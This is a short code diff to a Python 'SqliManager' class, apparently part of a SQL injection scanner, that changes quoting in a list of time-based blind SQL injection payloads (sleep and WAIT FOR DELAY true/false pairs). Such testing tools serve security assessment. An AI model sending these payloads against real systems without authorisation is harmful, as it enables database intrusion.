@@ -16,7 +16,7 @@ class SqliManager:
         self.time_based_payloads = [
             {'TruePld': '1\'OR(if(1=1,sleep(5),0))OR\'2', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))OR\'2'},
             {'TruePld': '1\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))--%20'},
-            {'TruePld': '1; WAIT FOR DELAY \'00:00:05\'', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01\''},
+            {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01'},
         ]
         self.delay_in_seconds = 5
 
